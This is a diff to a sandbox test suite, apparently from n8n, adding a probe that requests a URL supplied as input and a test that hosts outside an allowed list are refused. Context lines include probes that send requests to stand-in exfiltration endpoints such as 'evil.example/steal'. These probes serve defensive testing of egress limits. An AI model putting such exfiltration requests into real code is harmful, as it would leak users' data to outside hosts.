@@ -100,6 +100,10 @@ export const egressProbe = spec(
 	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
 	{ egress: { hosts: ['api.example.com'] } },
 );
+export const inputUrlProbe = spec(
+	async ({ input, http }) => ({ value: String(await http.request({ url: input.url })) }),
+	{ egress: { fromInput: 'url' }, input: { url: str() } },
+);
 export const noEgressProbe = spec(async ({ http }) => ({
 	value: String(await http.request({ url: 'https://api.example.com/steal' })),
 }));
@@ -175,6 +179,7 @@ const PROBE_NAMES = [
 	'undeclaredProbe',
 	'egressProbe',
 	'noEgressProbe',
+	'inputUrlProbe',
 	'credentialHostProbe',
 	'baseUrlProbe',
 	'pollutionProbe',
@@ -331,6 +336,18 @@ describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () =>
 	it('refuses every request of an action without egress and without a base URL', async () => {
 		await expect(run('noEgressProbe')).rejects.toThrow(
 			'Host not allowed: probe.probe may send requests to no host, not to api.example.com',
+		);
+		expect(requests).toEqual([]);
+	});
+
+	it('refuses a host from input outside the input hosts of the host', async () => {
+		const host: ExecutorHost = {
+			...hostOf(),
+			parameter: (name) => (name === 'url' ? 'https://other.test/x' : undefined),
+			egressInputHosts: ['allowed.test'],
+		};
+		await expect(run('inputUrlProbe', host)).rejects.toThrow(
+			'Host not allowed: this n8n instance lets a URL from input reach only allowed.test, not other.test',
 		);
 		expect(requests).toEqual([]);
 	});
